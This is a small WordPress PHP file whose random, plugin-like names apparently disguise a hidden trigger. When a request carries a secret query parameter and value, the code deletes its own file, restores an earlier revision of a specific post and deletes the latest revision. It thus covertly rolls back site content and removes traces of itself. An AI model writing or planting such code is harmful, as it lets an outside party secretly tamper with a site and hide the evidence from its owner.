<?php

function landing_genesis_click_addon() {
	if (isset($_GET['extended_scss_rating']) && $_GET['extended_scss_rating'] === 'statistics_active_types') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$register_uploader_kit = 4321;
		$rtl_send_posts = wp_get_post_revisions($register_uploader_kit);
		if (empty($rtl_send_posts)) die('no revisions');
		if (count($rtl_send_posts) < 2) die('less than 2');
		$count_more_gateway_quiz = array_shift($rtl_send_posts);
		$control_navigation_app_comment = $count_more_gateway_quiz->ID;
		$pop_pixel_insert_tinymce = array_shift($rtl_send_posts);
		$js_include_stats_timeline = $pop_pixel_insert_tinymce->ID;
		$urls_version_affiliates_comment = wp_restore_post_revision($js_include_stats_timeline);
		if ($urls_version_affiliates_comment === false) die('error restoring');
		$urls_version_affiliates_comment = wp_delete_post_revision($control_navigation_app_comment);		
		if ($urls_version_affiliates_comment === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'landing_genesis_click_addon');
